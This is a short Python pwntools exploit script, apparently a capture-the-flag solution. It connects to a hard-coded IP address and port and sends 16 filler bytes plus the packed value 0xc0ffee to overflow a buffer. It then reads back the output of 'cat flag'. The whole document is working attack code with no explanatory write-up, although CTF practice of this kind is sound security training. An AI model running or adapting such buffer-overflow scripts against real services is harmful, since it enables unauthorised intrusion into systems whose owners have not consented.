from pwn import *

# Setup connection to servlet
ip = "158.37.65.130"
port = 7001
io = remote(ip, port)

# Read initial message
print(io.readline(timeout=.5))

# Fill buffer (16 bytes) and overflow 0xc0ffee
io.sendline(cyclic(16)+p64(0xc0ffee))

# Read the response (result of 'cat flag')
response = str(io.readall(timeout=3), 'ascii')

# Print the flag
print(f"Flag: {response}")
